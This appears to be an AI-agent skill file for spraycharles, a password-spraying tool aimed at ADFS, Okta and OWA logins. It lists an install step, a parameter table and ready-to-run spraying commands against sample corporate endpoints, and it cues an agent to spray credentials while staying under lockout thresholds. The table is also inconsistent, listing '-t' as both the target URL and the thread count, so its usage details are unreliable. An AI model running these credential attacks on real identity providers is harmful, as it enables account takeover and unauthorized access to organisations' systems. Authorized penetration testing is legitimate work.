---
name: spraycharles-idp-spray
description: "spraycharles: multi-platform IdP spraying. Signals: brute force, password spraying, multi-IdP spray, ADFS, Okta."
zh-signals: "spraycharles: 多平台 IdP 喷洒。信号:暴力破解,口令喷射,多 IdP 喷洒,ADFS,Okta。"
when-to-use: >-
  Use when conducting authorized password spraying against a known identity provider such as
  ADFS, Okta, or OWA, staying under account lockout thresholds.
---

# spraycharles

- Attack Category: C28 Brute Force and Password Spraying
- Upstream Repository: https://github.com/Tw1sm/spraycharles
- Upstream License: BSD-3-Clause (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
pip install spraycharles
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `spraycharles -u users.txt -p pass.txt -a owa -t https://mail.t.com` | Multi-IdP spraying |
| `-a adfs` | ADFS |
| `-a okta` | Okta |
| `-t 5` | Threads |

## Attack Scenario Playbook

### Multi-Platform IdP Spraying

```bash
spraycharles -u users.txt -p pass.txt -a adfs -t https://adfs.corp.com
# 13 IdP templates
```

## Notes

From Tw1sm; supports spraying against 13 identity platforms.
